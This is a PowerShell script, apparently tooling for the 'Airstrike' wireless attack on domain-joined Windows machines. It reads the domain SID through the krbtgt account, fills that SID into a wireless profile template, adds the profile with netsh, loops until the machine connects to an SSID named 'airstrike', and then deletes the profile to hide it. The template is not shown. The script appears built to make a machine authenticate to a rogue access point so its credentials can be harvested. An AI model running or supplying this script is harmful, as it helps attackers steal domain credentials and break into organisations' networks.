
function Get-PrimaryDomainSID ()
{
  # Retreive the Domain SID
  # Copied from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60

  [string] $domainSID = $null

  [int] $domainRole = gwmi Win32_ComputerSystem | Select -Expand DomainRole
  [bool] $isDomainMember = ($domainRole -ne 0) -and ($domainRole -ne 2)

  if ($isDomainMember) {

    [string] $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
    [string] $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
    $domainSID = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
  }

  return $domainSID
}

$domainSID = Get-PrimaryDomainSID
(Get-Content '.\airstrike_template.xml') -replace "domain_SID", $domainSID | Set-Content '.\airstrike.xml'
Invoke-Expression "netsh wlan add profile filename=airstrike.xml user=current"

while ($true) {   
  Invoke-Expression "netsh wlan connect ssid=airstrike name=airstrike"
  
  if ($LASTEXITCODE -eq 0) {
    Invoke-Expression "netsh wlan delete profile name=airstrike"
    return
  }
  elseif ($LASTEXITCODE -eq 1){
    sleep 5
  }
}